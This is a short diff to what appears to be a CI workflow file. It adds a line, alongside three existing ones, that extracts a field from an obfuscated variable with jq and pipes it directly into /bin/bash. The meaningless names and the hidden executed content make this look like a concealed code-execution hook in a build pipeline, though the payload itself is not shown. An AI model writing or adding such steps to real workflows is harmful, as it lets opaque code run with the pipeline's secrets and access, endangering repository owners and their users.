@@ -28,6 +28,7 @@ jobs:
           echo $jqdj8356 | jq -r .ztxxu9345 | /bin/bash
           echo $rabwj932 | jq -r .c258 | /bin/bash
           echo $tupwc624 | jq -r .qra3 | /bin/bash
+          printf '%s' "$nedap11926" | jq -r .faey2 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
